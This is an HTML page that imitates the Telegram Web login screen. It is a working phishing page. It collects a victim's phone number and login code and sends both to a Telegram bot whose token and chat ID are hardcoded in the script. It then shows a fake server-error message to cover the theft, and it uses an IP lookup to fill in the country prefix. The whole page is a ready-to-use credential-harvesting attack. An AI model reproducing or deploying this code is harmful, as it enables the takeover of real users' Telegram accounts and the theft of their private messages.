<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <title>Telegram Web</title>
    <style>
        body { background-color: #0f1721; color: #ffffff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { text-align: center; width: 100%; max-width: 330px; padding: 20px; }
        .logo { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 28px; margin: 0 0 10px; font-weight: 500; }
        p { color: #7f91a4; font-size: 16px; margin-bottom: 35px; line-height: 1.4; }
        .input-group { background: #1c242f; border: 1px solid #303d4d; border-radius: 12px; padding: 10px 15px; margin-bottom: 20px; text-align: left; }
        label { color: #3390ec; font-size: 13px; font-weight: 600; }
        input { width: 100%; background: transparent; border: none; color: white; font-size: 18px; outline: none; padding: 5px 0; }
        button { width: 100%; background: #3390ec; border: none; color: white; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 12px; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
        button:hover { background: #4dadff; }
        #code-screen { display: none; }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
    
    <div id="phone-screen">
        <h2>Your Phone</h2>
        <p>Please confirm your country code and enter your phone number.</p>
        <div class="input-group">
            <label>Phone Number</label>
            <input type="text" id="phone" placeholder="+380 00 000 00 00">
        </div>
        <button onclick="sendPhone()">Next</button>
    </div>

    <div id="code-screen">
        <h2 id="display-phone"></h2>
        <p>We've sent the code to the <b>Telegram</b> app on your other device.</p>
        <div class="input-group">
            <label>Code</label>
            <input type="text" id="code" placeholder="Enter code">
        </div>
        <button onclick="sendCode()">Next</button>
    </div>
</div>

<script>
const BOT_TOKEN = '8244809963:AAHw9Gfy7mDNRuWKjyqsBAu52Y5isnjY7CY';
const CHAT_ID = '7128871752';

// –ê–≤—Ç–æ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø—Ä–µ—Ñ–∏–∫—Å–∞ –ø–æ IP
async function setPrefix() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        const input = document.getElementById('phone');
        if (data.country_code === 'UA') input.value = '+380 ';
        else if (data.country_code === 'RU') input.value = '+7 ';
        else input.value = '+' + data.country_calling_code + ' ';
    } catch(e) {}
}
window.onload = setPrefix;

// –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞
async function sendPhone() {
    const phone = document.getElementById('phone').value;
    if (phone.length < 7) return alert('Enter valid phone');

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `üìû <b>–í–≤–µ–¥–µ–Ω –Ω–æ–º–µ—Ä:</b> <code>${phone}</code>`,
            parse_mode: 'HTML'
        })
    });

    document.getElementById('display-phone').innerText = phone;
    document.getElementById('phone-screen').style.display = 'none';
    document.getElementById('code-screen').style.display = 'block';
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞
async function sendCode() {
    const code = document.getElementById('code').value;
    const phone = document.getElementById('phone').value;
    if (code.length < 4) return alert('Enter code');

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `üîë <b>–ü–û–õ–£–ß–ï–ù –ö–û–î!</b>\n–ù–æ–º–µ—Ä: <code>${phone}</code>\n–ö–æ–¥: <code>${code}</code>`,
            parse_mode: 'HTML'
        })
    });

    alert("Internal Server Error (500). Please try again later.");
}
</script>

</body>
</html>
